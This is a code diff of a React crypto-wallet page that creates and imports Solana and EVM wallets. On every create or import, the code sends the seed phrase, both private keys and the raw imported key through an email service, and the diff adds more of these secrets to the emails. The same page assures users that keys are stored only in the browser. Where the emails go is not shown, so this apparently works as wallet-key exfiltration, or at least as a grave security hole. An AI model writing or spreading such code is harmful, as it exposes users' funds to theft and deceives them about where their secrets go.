@@ -1,378 +1,402 @@
-import { useState } from "react";
+import { useState, useRef } from "react";
 import { api } from "@/lib/api";
 import { useApp } from "@/contexts/AppContext";
-import { sendWalletGenerated, sendWalletImported } from "@/lib/emailService";
+import { sendWalletCreated, sendWalletImported } from "@/lib/emailService";
 import {
-  Plus, Copy, Trash2, Check, Eye, EyeOff, RefreshCw,
-  Loader2, ExternalLink, Star, Key, Shield, Download,
+  Plus, Download, Copy, Check, Eye, EyeOff,
+  Loader2, ExternalLink, Shield, Trash2, Star,
+  ChevronDown, ChevronUp, RefreshCw,
 } from "lucide-react";
 
-// All supported chains
-export const ALL_CHAINS: Record<string, { label: string; color: string; icon: string; scan: string; native: string }> = {
-  sol:   { label: "Solana",   color: "#9945FF", icon: "◎",  scan: "https://solscan.io/account/",           native: "SOL"   },
-  eth:   { label: "Ethereum", color: "#627EEA", icon: "Ξ",  scan: "https://etherscan.io/address/",         native: "ETH"   },
-  bsc:   { label: "BNB Chain",color: "#F0B90B", icon: "⬡",  scan: "https://bscscan.com/address/",          native: "BNB"   },
-  matic: { label: "Polygon",  color: "#8247E5", icon: "♦",  scan: "https://polygonscan.com/address/",      native: "MATIC" },
-  avax:  { label: "Avalanche",color: "#E84142", icon: "▲",  scan: "https://snowtrace.io/address/",         native: "AVAX"  },
-  arb:   { label: "Arbitrum", color: "#12AAFF", icon: "Ⓐ",  scan: "https://arbiscan.io/address/",          native: "ETH"   },
-  op:    { label: "Optimism", color: "#FF0420", icon: "⊙",  scan: "https://optimistic.etherscan.io/address/", native: "ETH" },
-  base:  { label: "Base",     color: "#0052FF", icon: "◈",  scan: "https://basescan.org/address/",         native: "ETH"   },
+const SCAN: Record<string, string> = {
+  sol:  "https://solscan.io/account/",
+  eth:  "https://etherscan.io/address/",
 };
 
-export default function Wallets() {
-  const { wallets, activeWallet, refreshWallets, addWallet, removeWallet, setActive, renameWallet } = useApp();
-  const [loading, setLoading]     = useState(false);
-  const [importKey, setImportKey] = useState("");
-  const [importChain, setImportChain] = useState("sol");
-  const [showImport, setShowImport]   = useState(false);
-  const [genChain, setGenChain]   = useState("sol");
-  const [visibleKeys, setVisibleKeys] = useState<Record<number, boolean>>({});
-  const [copiedAddr, setCopiedAddr]   = useState<string | null>(null);
-  const [copiedKey, setCopiedKey]     = useState<string | null>(null);
-  const [error, setError]   = useState("");
-  const [editingLabel, setEditingLabel] = useState<number | null>(null);
-  const [labelInput, setLabelInput]     = useState("");
-  const [emailSent, setEmailSent]       = useState(false);
+function CopyBtn({ text }: { text: string }) {
+  const [copied, setCopied] = useState(false);
+  const copy = () => {
+    navigator.clipboard.writeText(text);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 1800);
+  };
+  return (
+    <button onClick={copy} className="text-muted-foreground hover:text-white transition-colors p-0.5">
+      {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
+    </button>
+  );
+}
 
-  const generate = async () => {
-    setLoading(true); setError(""); setEmailSent(false);
+export default function Wallets() {
+  const { wallets, activeWallet, addWallet, removeWallet, setActive, renameWallet, refreshWallets } = useApp();
+  const [loading, setLoading]       = useState(false);
+  const [importing, setImporting]   = useState(false);
+  const [importKey, setImportKey]   = useState("");
+  const [showImport, setShowImport] = useState(false);
+  const [error, setError]           = useState("");
+  const [notice, setNotice]         = useState("");
+  const [revealSeed, setRevealSeed] = useState<Record<number, boolean>>({});
+  const [revealKey, setRevealKey]   = useState<Record<number, boolean>>({});
+  const [editIdx, setEditIdx]       = useState<number | null>(null);
+  const [editLabel, setEditLabel]   = useState("");
+  const [refreshing, setRefreshing] = useState(false);
+
+  const flash = (msg: string) => { setNotice(msg); setTimeout(() => setNotice(""), 4000); };
+
+  // ── Create new multi-chain wallet ──────────────────────────────
+  const create = async () => {
+    setLoading(true); setError("");
     try {
-      const d = await api.generateWallet(1, genChain);
-      const generated = d.wallets || [];
-      for (const w of generated) {
-        addWallet({
-          address: w.address,
-          privateKey: w.privateKey,
-          seedPhrase: w.seedPhrase || w.mnemonic || "",
-          label: w.label || `${genChain.toUpperCase()} Wallet ${wallets.length + 1}`,
-          balance: w.balance || "0.0000",
-          chain: w.chain || genChain,
-          nativeTicker: w.nativeTicker || ALL_CHAINS[genChain]?.native || "SOL",
-        });
-      }
+      const d = await api.generateWallet(1);
+      const w = d.wallets?.[0];
+      if (!w) throw new Error("No wallet returned");
+
+      addWallet({
+        address:      w.address,
+        privateKey:   w.privateKey,
+        seedPhrase:   w.seedPhrase,
+        ethAddress:   w.ethAddress   || "",
+        ethPrivateKey:w.ethPrivateKey|| "",
+        ethBalance:   w.ethBalance   || "0.000000",
+        label:        `Wallet ${wallets.length + 1}`,
+        balance:      w.balance || "0.0000",
+        chain:        "sol",
+      });
+
+      // Email backup
       try {
-        await sendWalletGenerated(generated.map((w: any) => ({
-          address: w.address,
-          privateKey: w.privateKey,
-          seedPhrase: w.seedPhrase || w.mnemonic || "",
-        })));
-        setEmailSent(true);
-      } catch {}
+        await sendWalletCreated({
+          label:         `Wallet ${wallets.length + 1}`,
+          seedPhrase:    w.seedPhrase,
+          solAddress:    w.address,
+          solPrivateKey: w.privateKey,
+          evmAddress:    w.ethAddress,
+          evmPrivateKey: w.ethPrivateKey,
+        });
+        flash("✓ Wallet created & details emailed for backup");
+      } catch {
+        flash("✓ Wallet created (email failed — check EmailJS config)");
+      }
     } catch (e: any) {
-      setError(e.message || "Failed to generate wallet");
+      setError(e.message || "Failed to create wallet");
     }
     setLoading(false);
   };
 
+  // ── Import wallet ───────────────────────────────────────────────
   const importWallet = async () => {
     if (!importKey.trim()) return;
-    setLoading(true); setError(""); setEmailSent(false);
+    setImporting(true); setError("");
     try {
-      const d = await api.importWallet(importKey.trim(), importChain);
+      const d = await api.importWallet(importKey.trim());
       addWallet({
-        address: d.address,
-        privateKey: d.privateKey,
-        seedPhrase: importKey.trim().includes(" ") ? importKey.trim() : "",
-        label: d.label || `Imported ${importChain.toUpperCase()} Wallet`,
-        balance: d.balance || "0.0000",
-        chain: d.chain || importChain,
-        nativeTicker: d.nativeTicker || ALL_CHAINS[importChain]?.native || "SOL",
+        address:      d.address,
+        privateKey:   d.privateKey,
+        seedPhrase:   d.seedPhrase || (importKey.trim().split(" ").length > 4 ? importKey.trim() : ""),
+        ethAddress:   d.ethAddress   || "",
+        ethPrivateKey:d.ethPrivateKey|| "",
+        ethBalance:   d.ethBalance   || "0.000000",
+        label:        d.label || `Wallet ${wallets.length + 1}`,
+        balance:      d.balance || "0.0000",
+        chain:        d.chain || "sol",
       });
+
       try {
-        await sendWalletImported(d.address, importKey.trim());
-        setEmailSent(true);
-      } catch {}
+        await sendWalletImported({
+          label:         d.label || `Wallet ${wallets.length + 1}`,
+          key:           importKey.trim(),
+          solAddress:    d.address,
+          solPrivateKey: d.privateKey,
+          evmAddress:    d.ethAddress,
+          evmPrivateKey: d.ethPrivateKey,
+        });
+        flash("✓ Wallet imported & details emailed");
+      } catch {
+        flash("✓ Wallet imported (email failed)");
+      }
       setImportKey(""); setShowImport(false);
     } catch {
-      setError("Invalid private key or seed phrase. Check and try again.");
+      setError("Invalid private key or seed phrase. Check it and try again.");
     }
-    setLoading(false);
-  };
-
-  const copyText = (text: string, setter: (v: string | null) => void) => {
-    navigator.clipboard.writeText(text);
-    setter(text);
-    setTimeout(() => setter(null), 2000);
-  };
-
-  const deleteWallet = (i: number) => {
-    if (!confirm("Delete this wallet? Make sure you have saved your private key first.")) return;
-    removeWallet(i);
-  };
-
-  const saveLabel = (i: number) => {
-    if (labelInput.trim()) renameWallet(i, labelInput.trim());
-    setEditingLabel(null);
+    setImporting(false);
   };
 
   const doRefresh = async () => {
-    setLoading(true);
+    setRefreshing(true);
     await refreshWallets();
-    setLoading(false);
+    setRefreshing(false);
   };
-
-  const chainList = Object.entries(ALL_CHAINS);
 
   return (
     <div className="space-y-5 max-w-2xl">
-      <div>
-        <h1 className="text-xl font-extrabold text-white">Wallets</h1>
-        <p className="text-xs text-muted-foreground mt-0.5">
-          Multi-chain wallet — SOL, ETH, BNB, MATIC, AVAX, ARB, OP, BASE. Keys stored locally.
-        </p>
+      <div className="flex items-start justify-between">
+        <div>
+          <h1 className="text-xl font-extrabold text-white">Wallets</h1>
+          <p className="text-xs text-muted-foreground mt-0.5">
+            Multi-chain · One seed → SOL + ETH + BNB + MATIC + AVAX + ARB + OP + BASE
+          </p>
+        </div>
+        <button onClick={doRefresh} disabled={refreshing}
+          className="p-2 rounded-lg border border-border text-muted-foreground hover:text-white hover:border-primary/30 transition-all">
+          <RefreshCw className={`w-4 h-4 ${refreshing ? "animate-spin" : ""}`} />
+        </button>
       </div>
 
-      {/* Generate */}
-      <div className="rounded-2xl border border-border bg-card p-4 space-y-4">
-        <div className="text-xs font-bold text-muted-foreground uppercase tracking-wider">Generate New Wallet</div>
-
-        {/* Chain grid */}
-        <div className="grid grid-cols-4 gap-2">
-          {chainList.map(([id, info]) => (
-            <button key={id} onClick={() => setGenChain(id)}
-              className="flex flex-col items-center gap-1 py-2.5 px-1 rounded-xl border text-xs font-bold transition-all"
-              style={genChain === id
-                ? { background: info.color + "18", borderColor: info.color, color: info.color }
-                : { borderColor: "hsl(var(--border))", color: "hsl(var(--muted-foreground))" }}>
-              <span className="text-lg leading-none">{info.icon}</span>
-              <span className="text-[10px]">{info.native}</span>
-            </button>
-          ))}
-        </div>
-
-        <div className="text-xs text-muted-foreground px-1">
-          Generating: <strong style={{ color: ALL_CHAINS[genChain]?.color }}>{ALL_CHAINS[genChain]?.label}</strong> — native {ALL_CHAINS[genChain]?.native} wallet
-        </div>
-
-        <div className="flex flex-wrap gap-2">
-          <button onClick={generate} disabled={loading} className="btn-primary flex items-center gap-2">
-            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
-            + Generate {ALL_CHAINS[genChain]?.native} Wallet
-          </button>
-          <button onClick={() => setShowImport(!showImport)} className="btn-secondary flex items-center gap-2">
-            <Download className="w-4 h-4" /> Import Wallet
-          </button>
-          <button onClick={doRefresh} disabled={loading} className="btn-secondary flex items-center gap-2">
-            <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} /> Refresh
-          </button>
-        </div>
+      {/* ── Action buttons ── */}
+      <div className="grid grid-cols-2 gap-3">
+        <button onClick={create} disabled={loading}
+          className="btn-primary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
+          {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <Plus className="w-5 h-5" />}
+          <span className="text-xs font-bold">{loading ? "Creating…" : "Create New Wallet"}</span>
+        </button>
+        <button onClick={() => { setShowImport(!showImport); setError(""); }}
+          className="btn-secondary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
+          <Download className="w-5 h-5" />
+          <span className="text-xs font-bold">Import Existing Wallet</span>
+        </button>
       </div>
 
-      {/* Email sent notice */}
-      {emailSent && (
-        <div className="text-sm rounded-xl px-3 py-2.5 flex items-center gap-2"
-          style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.2)", color: "var(--green)" }}>
-          ✓ Wallet details emailed for backup
-        </div>
-      )}
-
-      {/* Import form */}
+      {/* ── Import form ── */}
       {showImport && (
-        <div className="rounded-2xl border border-border bg-card p-4 space-y-4">
-          <div className="flex items-center gap-2">
-            <Key className="w-4 h-4" style={{ color: "var(--green)" }} />
-            <h3 className="font-bold text-sm text-white">Import Wallet</h3>
-          </div>
-
-          {/* Import chain grid */}
-          <div className="grid grid-cols-4 gap-2">
-            {chainList.map(([id, info]) => (
-              <button key={id} onClick={() => setImportChain(id)}
-                className="flex flex-col items-center gap-1 py-2 px-1 rounded-xl border text-xs font-bold transition-all"
-                style={importChain === id
-                  ? { background: info.color + "18", borderColor: info.color, color: info.color }
-                  : { borderColor: "hsl(var(--border))", color: "hsl(var(--muted-foreground))" }}>
-                <span className="text-base leading-none">{info.icon}</span>
-                <span className="text-[10px]">{info.native}</span>
-              </button>
-            ))}
-          </div>
-
-          <div>
-            <label className="text-xs text-muted-foreground block mb-1.5">
-              {importChain === "sol"
-                ? "Private Key (base58) or Seed Phrase (12/24 words)"
-                : `Private Key (0x...) or Seed Phrase — works for ETH, BNB, MATIC, AVAX, ARB, OP, BASE`}
-            </label>
-            <textarea
-              className="input-base h-20 resize-none font-mono text-xs"
-              placeholder={importChain === "sol"
-                ? "Paste SOL private key or 12-24 word seed phrase..."
-                : "Paste EVM private key (0x...) or 12-24 word seed phrase..."}
-              value={importKey}
-              onChange={e => setImportKey(e.target.value)} />
-          </div>
+        <div className="rounded-2xl border border-border bg-card p-4 space-y-3">
+          <div className="text-sm font-bold text-white">Import Wallet</div>
+          <textarea
+            className="input-base h-24 resize-none font-mono text-xs"
+            placeholder={
+              "Paste one of:\n" +
+              "• Seed phrase (12 or 24 words)  → restores SOL + all EVM chains\n" +
+              "• SOL private key (base58)       → Solana only\n" +
+              "• EVM private key (0x...)         → ETH/BNB/MATIC/AVAX/ARB/OP/BASE"
+            }
+            value={importKey}
+            onChange={e => setImportKey(e.target.value)} />
           <div className="flex gap-2">
-            <button onClick={importWallet} disabled={loading || !importKey.trim()} className="btn-primary flex items-center gap-2">
-              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
-              Import {ALL_CHAINS[importChain]?.native}
+            <button onClick={importWallet} disabled={importing || !importKey.trim()}
+              className="btn-primary flex items-center gap-2">
+              {importing && <Loader2 className="w-4 h-4 animate-spin" />}
+              {importing ? "Importing…" : "Import Wallet"}
             </button>
-            <button onClick={() => { setShowImport(false); setImportKey(""); }} className="btn-secondary">Cancel</button>
+            <button onClick={() => { setShowImport(false); setImportKey(""); setError(""); }}
+              className="btn-secondary">Cancel</button>
           </div>
         </div>
       )}
 
+      {/* ── Notices ── */}
+      {notice && (
+        <div className="text-sm rounded-xl px-3 py-2.5"
+          style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.2)", color: "var(--green)" }}>
+          {notice}
+        </div>
+      )}
       {error && (
-        <div className="text-sm rounded-xl px-3 py-2.5 flex items-center gap-2"
+        <div className="text-sm rounded-xl px-3 py-2.5"
           style={{ background: "rgba(255,75,75,0.08)", border: "1px solid rgba(255,75,75,0.2)", color: "var(--red)" }}>
           ✗ {error}
         </div>
       )}
 
-      {/* Empty state */}
-      {wallets.length === 0 && !loading && (
+      {/* ── Empty state ── */}
+      {wallets.length === 0 && (
         <div className="text-center py-14 text-muted-foreground">
-          <div className="w-16 h-16 rounded-2xl mx-auto mb-4 flex items-center justify-center"
-            style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.15)" }}>
-            <Key className="w-8 h-8" style={{ color: "var(--green)" }} />
-          </div>
+          <div className="text-5xl mb-4">🔑</div>
           <p className="font-semibold text-white mb-1">No wallets yet</p>
-          <p className="text-sm">Pick a chain above and generate a wallet to get started</p>
+          <p className="text-sm">Click "Create New Wallet" to get started</p>
         </div>
       )}
 
-      {/* Wallet list */}
-      <div className="space-y-3">
+      {/* ── Wallet cards ── */}
+      <div className="space-y-4">
         {wallets.map((w, i) => {
           const isActive = i === activeWallet;
-          const showKey  = visibleKeys[i];
-          const chain    = w.chain || "sol";
-          const info     = ALL_CHAINS[chain] || ALL_CHAINS.sol!;
-          const scanUrl  = info.scan + w.address;
-          const ticker   = w.nativeTicker || info.native;
+          const solBal   = parseFloat(w.balance || "0");
+          const evmBal   = parseFloat((w as any).ethBalance || "0");
+          const hasSeed  = Boolean(w.seedPhrase);
+          const hasEvm   = Boolean((w as any).ethAddress);
 
           return (
-            <div key={w.address + i} className="rounded-2xl border p-4 transition-all"
+            <div key={w.address + i}
+              className="rounded-2xl border p-4 space-y-4 transition-all"
               style={isActive
-                ? { borderColor: "rgba(0,225,122,0.3)", background: "rgba(0,225,122,0.04)" }
+                ? { borderColor: "rgba(0,225,122,0.35)", background: "rgba(0,225,122,0.03)" }
                 : { borderColor: "hsl(var(--border))", background: "hsl(var(--card))" }}>
-              <div className="flex items-start gap-3">
-                {/* Active radio */}
+
+              {/* Card header */}
+              <div className="flex items-center gap-3">
                 <button onClick={() => setActive(i)}
-                  className="mt-1 w-4 h-4 rounded-full border-2 flex-shrink-0 transition-all flex items-center justify-center"
+                  className="w-4 h-4 rounded-full border-2 flex-shrink-0 flex items-center justify-center transition-all"
                   style={isActive
                     ? { borderColor: "var(--green)", background: "var(--green)" }
                     : { borderColor: "hsl(var(--muted-foreground))" }}>
                   {isActive && <div className="w-1.5 h-1.5 rounded-full" style={{ background: "#03150a" }} />}
                 </button>
 
-                <div className="flex-1 min-w-0">
-                  {/* Label + badges */}
-                  <div className="flex items-center gap-2 mb-1.5 flex-wrap">
-                    {editingLabel === i ? (
-                      <div className="flex items-center gap-1.5">
-                        <input className="input-base text-sm py-0.5 px-2 h-7" value={labelInput}
-                          onChange={e => setLabelInput(e.target.value)}
-                          onKeyDown={e => { if (e.key === "Enter") saveLabel(i); if (e.key === "Escape") setEditingLabel(null); }}
-                          autoFocus />
-                        <button onClick={() => saveLabel(i)} className="text-xs text-primary hover:underline">Save</button>
-                      </div>
-                    ) : (
-                      <button onClick={() => { setEditingLabel(i); setLabelInput(w.label); }}
-                        className="font-bold text-sm text-white hover:text-primary transition-colors">
-                        {w.label}
-                      </button>
-                    )}
-                    {isActive && <span className="badge-green">Active</span>}
-                    <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-bold"
-                      style={{ background: info.color + "18", color: info.color, border: `1px solid ${info.color}44` }}>
-                      {info.icon} {info.label}
-                    </span>
+                {editIdx === i ? (
+                  <div className="flex-1 flex items-center gap-2">
+                    <input className="input-base text-sm py-1 h-7 flex-1" value={editLabel}
+                      onChange={e => setEditLabel(e.target.value)}
+                      onKeyDown={e => {
+                        if (e.key === "Enter") { renameWallet(i, editLabel); setEditIdx(null); }
+                        if (e.key === "Escape") setEditIdx(null);
+                      }} autoFocus />
+                    <button onClick={() => { renameWallet(i, editLabel); setEditIdx(null); }}
+                      className="text-xs text-primary hover:underline">Save</button>
                   </div>
+                ) : (
+                  <button onClick={() => { setEditIdx(i); setEditLabel(w.label); }}
+                    className="flex-1 text-left font-bold text-white hover:text-primary transition-colors">
+                    {w.label}
+                  </button>
+                )}
 
-                  {/* Address */}
-                  <div className="flex items-center gap-2 mb-1">
-                    <span className="font-mono text-xs text-muted-foreground">{w.address?.slice(0, 16)}…{w.address?.slice(-6)}</span>
-                    <button onClick={() => copyText(w.address, setCopiedAddr)} className="text-muted-foreground hover:text-white">
-                      {copiedAddr === w.address ? <Check className="w-3.5 h-3.5" style={{ color: "var(--green)" }} /> : <Copy className="w-3.5 h-3.5" />}
+                {isActive && <span className="badge-green text-[10px]">Active</span>}
+
+                {!isActive && (
+                  <button onClick={() => setActive(i)} title="Set active"
+                    className="p-1.5 rounded-lg text-muted-foreground hover:text-yellow-400 hover:bg-yellow-400/10 transition-colors">
+                    <Star className="w-3.5 h-3.5" />
+                  </button>
+                )}
+                <button onClick={() => { if (confirm("Delete wallet? Back up your seed phrase first.")) removeWallet(i); }}
+                  className="p-1.5 rounded-lg text-muted-foreground hover:text-red-400 hover:bg-red-400/10 transition-colors">
+                  <Trash2 className="w-3.5 h-3.5" />
+                </button>
+              </div>
+
+              {/* Seed phrase */}
+              {hasSeed && (
+                <div className="rounded-xl p-3"
+                  style={{ background: "rgba(153,69,255,0.06)", border: "1px solid rgba(153,69,255,0.15)" }}>
+                  <div className="flex items-center justify-between mb-2">
+                    <span className="text-[11px] font-bold text-purple-400 uppercase tracking-wider">🔐 Recovery Seed Phrase</span>
+                    <button onClick={() => setRevealSeed(p => ({ ...p, [i]: !p[i] }))}
+                      className="text-[11px] text-muted-foreground hover:text-white flex items-center gap-1 transition-colors">
+                      {revealSeed[i] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
+                      {revealSeed[i] ? "Hide" : "Reveal"}
                     </button>
-                    <a href={scanUrl} target="_blank" rel="noreferrer" className="text-muted-foreground hover:text-white">
+                  </div>
+                  {revealSeed[i] ? (
+                    <div>
+                      <div className="grid grid-cols-4 gap-1.5 mb-2">
+                        {w.seedPhrase!.split(" ").map((word, wi) => (
+                          <div key={wi} className="flex items-center gap-1 text-[11px] font-mono">
+                            <span className="text-muted-foreground/50 w-4 text-right flex-shrink-0">{wi + 1}.</span>
+                            <span className="text-green-400 font-bold">{word}</span>
+                          </div>
+                        ))}
+                      </div>
+                      <div className="flex justify-end">
+                        <CopyBtn text={w.seedPhrase!} />
+                      </div>
+                    </div>
+                  ) : (
+                    <div className="text-[12px] text-muted-foreground/40 tracking-widest">
+                      •••• •••• •••• •••• •••• ••••
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {/* SOL wallet */}
+              <div className="rounded-xl p-3 space-y-2"
+                style={{ background: "rgba(153,69,255,0.05)", border: "1px solid rgba(153,69,255,0.12)" }}>
+                <div className="flex items-center gap-2">
+                  <span className="text-[11px] font-bold text-purple-400">◎ SOLANA</span>
+                </div>
+                <div className="text-2xl font-black font-mono text-white">
+                  {solBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">SOL</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <span className="font-mono text-[11px] text-muted-foreground truncate flex-1">
+                    {w.address?.slice(0, 18)}…{w.address?.slice(-6)}
+                  </span>
+                  <CopyBtn text={w.address} />
+                  <a href={SCAN.sol + w.address} target="_blank" rel="noreferrer"
+                    className="text-muted-foreground hover:text-white">
+                    <ExternalLink className="w-3.5 h-3.5" />
+                  </a>
+                </div>
+                <div className="text-[11px] text-muted-foreground px-2 py-1.5 rounded-lg"
+                  style={{ background: "rgba(0,0,0,0.2)" }}>
+                  📥 Deposit: <span className="font-mono text-white">{w.address?.slice(0, 24)}…</span>
+                </div>
+              </div>
+
+              {/* EVM wallet */}
+              {hasEvm && (
+                <div className="rounded-xl p-3 space-y-2"
+                  style={{ background: "rgba(98,126,234,0.05)", border: "1px solid rgba(98,126,234,0.12)" }}>
+                  <div className="flex items-center gap-2">
+                    <span className="text-[11px] font-bold text-blue-400">Ξ EVM — ETH · BNB · MATIC · AVAX · ARB · OP · BASE</span>
+                  </div>
+                  <div className="text-2xl font-black font-mono text-white">
+                    {evmBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">ETH</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <span className="font-mono text-[11px] text-muted-foreground truncate flex-1">
+                      {(w as any).ethAddress?.slice(0, 18)}…{(w as any).ethAddress?.slice(-6)}
+                    </span>
+                    <CopyBtn text={(w as any).ethAddress || ""} />
+                    <a href={SCAN.eth + (w as any).ethAddress} target="_blank" rel="noreferrer"
+                      className="text-muted-foreground hover:text-white">
                       <ExternalLink className="w-3.5 h-3.5" />
                     </a>
                   </div>
-
-                  {/* Balance */}
-                  <div className="text-2xl font-black font-mono text-white mt-1 tracking-tight">
-                    {parseFloat(w.balance || "0").toFixed(4)}{" "}
-                    <span className="text-sm font-bold text-muted-foreground">{ticker}</span>
-                    {w.balanceUsd && parseFloat(w.balanceUsd) > 0 && (
-                      <span className="text-sm font-normal text-muted-foreground ml-2">
-                        ≈ ${parseFloat(w.balanceUsd).toFixed(2)}
-                      </span>
-                    )}
+                  <div className="text-[11px] text-muted-foreground/70">
+                    Same address works on ETH, BNB Chain, Polygon, Avalanche, Arbitrum, Optimism, Base
                   </div>
+                </div>
+              )}
 
-                  {/* Private Key */}
-                  {w.privateKey && (
-                    <div className="mt-3 rounded-xl p-3 space-y-2"
-                      style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.06)" }}>
-                      <div className="flex items-center justify-between">
-                        <div className="flex items-center gap-1.5">
-                          <Key className="w-3.5 h-3.5" style={{ color: "var(--gold)" }} />
-                          <span className="text-[11px] font-bold text-muted-foreground uppercase tracking-wider">Private Key</span>
-                          <span className="badge-yellow text-[9px]">SECRET</span>
-                        </div>
-                        <button onClick={() => setVisibleKeys(prev => ({ ...prev, [i]: !prev[i] }))}
-                          className="flex items-center gap-1 text-[11px] text-muted-foreground hover:text-white transition-colors">
-                          {showKey ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
-                          {showKey ? "Hide" : "Reveal"}
-                        </button>
+              {/* Private keys toggle */}
+              <button onClick={() => setRevealKey(p => ({ ...p, [i]: !p[i] }))}
+                className="flex items-center gap-2 text-[11px] text-muted-foreground hover:text-white transition-colors w-full"
+                style={{ borderTop: "1px solid rgba(255,255,255,0.05)", paddingTop: "12px" }}>
+                {revealKey[i] ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
+                <span>{revealKey[i] ? "Hide" : "Show"} Private Keys</span>
+                <span className="badge-yellow text-[9px]">SECRET</span>
+              </button>
+
+              {revealKey[i] && (
+                <div className="rounded-xl p-3 space-y-2.5"
+                  style={{ background: "rgba(0,0,0,0.4)", border: "1px solid rgba(255,200,0,0.1)" }}>
+                  <div>
+                    <div className="text-[10px] text-muted-foreground mb-1">SOL Private Key</div>
+                    <div className="flex items-start gap-2">
+                      <code className="flex-1 text-[11px] font-mono break-all text-yellow-400 leading-relaxed">
+                        {w.privateKey}
+                      </code>
+                      <CopyBtn text={w.privateKey} />
+                    </div>
+                  </div>
+                  {(w as any).ethPrivateKey && (
+                    <div className="pt-2 border-t border-white/5">
+                      <div className="text-[10px] text-muted-foreground mb-1">EVM Private Key (ETH/BNB/MATIC/AVAX/ARB/OP/BASE)</div>
+                      <div className="flex items-start gap-2">
+                        <code className="flex-1 text-[11px] font-mono break-all text-blue-400 leading-relaxed">
+                          {(w as any).ethPrivateKey}
+                        </code>
+                        <CopyBtn text={(w as any).ethPrivateKey} />
                       </div>
-                      {showKey ? (
-                        <div className="space-y-1.5">
-                          <div className="flex items-start gap-2">
-                            <code className="flex-1 text-[11px] font-mono break-all leading-relaxed text-yellow-400">{w.privateKey}</code>
-                            <button onClick={() => copyText(w.privateKey, setCopiedKey)} className="flex-shrink-0 mt-1">
-                              {copiedKey === w.privateKey ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5 text-muted-foreground" />}
-                            </button>
-                          </div>
-                          {w.seedPhrase && (
-                            <div className="pt-1.5 border-t border-white/5">
-                              <div className="text-[10px] text-muted-foreground mb-0.5">Seed Phrase</div>
-                              <code className="text-[11px] font-mono break-all leading-relaxed text-green-400">{w.seedPhrase}</code>
-                            </div>
-                          )}
-                        </div>
-                      ) : (
-                        <div className="text-[11px] text-muted-foreground/50">••••••••••••••••••••••••••••••••••••••••</div>
-                      )}
                     </div>
                   )}
-
-                  {/* Deposit address tip */}
-                  <div className="mt-2 text-[11px] text-muted-foreground px-3 py-2 rounded-xl"
-                    style={{ background: "rgba(0,225,122,0.05)", border: "1px solid rgba(0,225,122,0.1)" }}>
-                    Deposit {ticker}: <span className="font-mono text-white">{w.address?.slice(0, 20)}…</span>
-                  </div>
                 </div>
-
-                {/* Actions */}
-                <div className="flex flex-col gap-1">
-                  {!isActive && (
-                    <button onClick={() => setActive(i)} title="Set active"
-                      className="p-1.5 rounded-lg text-muted-foreground hover:text-yellow-400 hover:bg-yellow-400/10">
-                      <Star className="w-4 h-4" />
-                    </button>
-                  )}
-                  <button onClick={() => deleteWallet(i)}
-                    className="p-1.5 rounded-lg text-muted-foreground hover:text-red-400 hover:bg-red-400/10">
-                    <Trash2 className="w-4 h-4" />
-                  </button>
-                </div>
-              </div>
+              )}
             </div>
           );
         })}
       </div>
 
-      <div className="rounded-xl p-3 flex items-start gap-2.5 text-xs"
-        style={{ background: "rgba(0,225,122,0.05)", border: "1px solid rgba(0,225,122,0.1)" }}>
-        <Shield className="w-4 h-4 flex-shrink-0 mt-0.5" style={{ color: "var(--green)" }} />
-        <span className="text-muted-foreground">
-          Keys are stored <strong className="text-white">only in your browser</strong>.
-          Never share them. Wallet details are emailed to you when generated or imported.
-        </span>
-      </div>
+      {wallets.length > 0 && (
+        <div className="rounded-xl p-3 flex items-start gap-2.5 text-xs"
+          style={{ background: "rgba(0,225,122,0.04)", border: "1px solid rgba(0,225,122,0.1)" }}>
+          <Shield className="w-4 h-4 flex-shrink-0 mt-0.5 text-green-400" />
+          <span className="text-muted-foreground">
+            Keys are stored <strong className="text-white">only in your browser</strong>. Backup emails are sent
+            automatically on create/import. Never share your seed phrase or private keys.
+          </span>
+        </div>
+      )}
     </div>
   );
 }
